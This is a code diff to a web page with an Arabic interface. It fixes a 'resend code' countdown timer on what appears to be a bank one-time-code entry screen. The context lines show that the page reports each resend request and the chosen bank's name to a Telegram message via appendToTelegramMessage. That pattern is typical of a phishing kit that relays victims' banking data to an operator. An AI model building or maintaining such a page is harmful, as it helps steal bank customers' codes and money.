@@ -2072,12 +2072,14 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
         }
 
         // مؤقت إعادة إرسال الرمز
+        let resendCountdown;
         function startResendTimer() {
+            if (resendCountdown) clearInterval(resendCountdown);
+            
             let timeLeft = 30;
             const resendBtn = document.getElementById('resendBtn');
-            const resendTimer = document.getElementById('resendTimer');
             
-            if (!resendBtn || !resendTimer) return;
+            if (!resendBtn) return;
 
             resendBtn.disabled = true;
             resendBtn.style.color = '#666';
@@ -2085,13 +2087,13 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
             resendBtn.style.textDecoration = 'none';
             resendBtn.innerHTML = `إعادة إرسال الرمز خلال <span id="resendTimer">${timeLeft}</span> ثانية`;
 
-            const countdown = setInterval(() => {
+            resendCountdown = setInterval(() => {
                 timeLeft--;
                 const timerSpan = document.getElementById('resendTimer');
                 if (timerSpan) timerSpan.textContent = timeLeft;
 
                 if (timeLeft <= 0) {
-                    clearInterval(countdown);
+                    clearInterval(resendCountdown);
                     resendBtn.disabled = false;
                     resendBtn.style.color = 'var(--primary-color)';
                     resendBtn.style.cursor = 'pointer';
@@ -2103,7 +2105,7 @@ body { font-family: Tajawal, sans-serif; background-color: rgb(249, 249, 249); c
                         const bank = banks[currentBank];
                         appendToTelegramMessage(`🔄 <b>طلب إعادة إرسال الرمز</b>\nالبنك: ${bank ? bank.name : 'غير معروف'}`);
                         
-                        // إعادة تشغيل المؤقت
+                        // إعادة تشغيل المؤقت فوراً
                         startResendTimer();
                     };
                 }
